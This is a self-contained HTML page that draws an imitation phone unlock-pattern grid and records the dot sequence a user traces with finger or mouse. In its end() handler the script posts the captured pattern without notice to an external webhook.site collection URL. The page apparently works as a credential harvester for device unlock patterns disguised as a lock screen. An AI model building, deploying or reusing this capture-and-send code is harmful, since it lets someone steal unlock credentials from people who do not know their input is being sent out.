<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Anchu</title>

<style>
body {
  margin: 0;
  background: #111;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.wrapper {
  position: relative;
  width: 80vw;
  height: 80vw;

  display: flex;
  justify-content: center;
  align-items: center;
}



canvas {
  position: absolute;
  top: 0;
  left: 0;
  z-index: 1;
}


.grid {
  display: grid;
  grid-template-columns: repeat(3, 22vw);

  /* ⭐ separate control */
  column-gap: 10vw;   /* left-right spacing */
  row-gap: 16vh;      /* top-bottom spacing (THIS fixes height) */

  justify-content: center;
  align-items: center;
  touch-action: none;
}

.dot {
  width: 5vw;
  height: 5vw;
  background: #888;
  border-radius: 50%;
  margin: auto;
}

.dot.active {
  background: #4CAF50;
  transform: scale(1.8);
}
</style>
</head>

<body>

<div class="wrapper">
  <canvas id="canvas"></canvas>

  <div class="grid" id="grid">
    <div class="dot" data-id="1"></div>
    <div class="dot" data-id="2"></div>
    <div class="dot" data-id="3"></div>
    <div class="dot" data-id="4"></div>
    <div class="dot" data-id="5"></div>
    <div class="dot" data-id="6"></div>
    <div class="dot" data-id="7"></div>
    <div class="dot" data-id="8"></div>
    <div class="dot" data-id="9"></div>
  </div>
</div>

<script>
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const grid = document.getElementById("grid");
const dots = document.querySelectorAll(".dot");

let pattern = [];
let drawing = false;
let current = null;

// ✅ Fix canvas size
function resize() {
  const rect = grid.getBoundingClientRect();
  canvas.width = rect.width;
  canvas.height = rect.height;

  canvas.style.width = rect.width + "px";
  canvas.style.height = rect.height + "px";
}
resize();
window.addEventListener("resize", resize);

// ✅ Get dot center
function getCenter(dot) {
  const gridRect = grid.getBoundingClientRect();
  const rect = dot.getBoundingClientRect();

  return {
    x: rect.left - gridRect.left + rect.width / 2,
    y: rect.top - gridRect.top + rect.height / 2
  };
}

// ✅ Get touch or mouse point
function getPoint(e) {
  if (e.touches) e = e.touches[0];

  const rect = grid.getBoundingClientRect();

  return {
    x: e.clientX - rect.left,
    y: e.clientY - rect.top,
    cx: e.clientX,
    cy: e.clientY
  };
}

// ✅ Draw lines
function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  if (pattern.length > 0) {
    ctx.strokeStyle = "#4CAF50";
    ctx.lineWidth = 6;
    ctx.lineCap = "round";

    ctx.beginPath();

    pattern.forEach((id, i) => {
      const dot = document.querySelector(`[data-id='${id}']`);
      const p = getCenter(dot);

      if (i === 0) ctx.moveTo(p.x, p.y);
      else ctx.lineTo(p.x, p.y);
    });

    if (current) {
      ctx.lineTo(current.x, current.y);
    }

    ctx.stroke();
  }

  requestAnimationFrame(draw);
}
draw();

// ✅ Activate dot
function activate(dot) {
  const id = dot.dataset.id;

  if (!pattern.includes(id)) {
    pattern.push(id);
    dot.classList.add("active");
  }
}

// ✅ Start
function start(e) {
  drawing = true;
  pattern = [];

  const p = getPoint(e);
  current = p;

  const el = document.elementFromPoint(p.cx, p.cy);
  if (el && el.classList.contains("dot")) activate(el);
}

// ✅ Move
function move(e) {
  if (!drawing) return;

  const p = getPoint(e);
  current = p;

  const el = document.elementFromPoint(p.cx, p.cy);
  if (el && el.classList.contains("dot")) activate(el);
}

// ✅ End
function end() {
  if (!drawing) return;
  drawing = false;

  const result = pattern.join("-");
  alert("Pattern: " + result);

  fetch("https://webhook.site/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b", {
    method: "POST",
    mode: "no-cors",
    body: "pattern=" + result
  });

  setTimeout(() => {
    pattern = [];
    current = null;
    dots.forEach(d => d.classList.remove("active"));
  }, 600);
}

// ✅ Use BOTH mouse + touch (important for your device)
document.addEventListener("mousedown", start);
document.addEventListener("mousemove", move);
document.addEventListener("mouseup", end);

document.addEventListener("touchstart", start, { passive: false });
document.addEventListener("touchmove", move, { passive: false });
document.addEventListener("touchend", end);
</script>

</body>
</html>
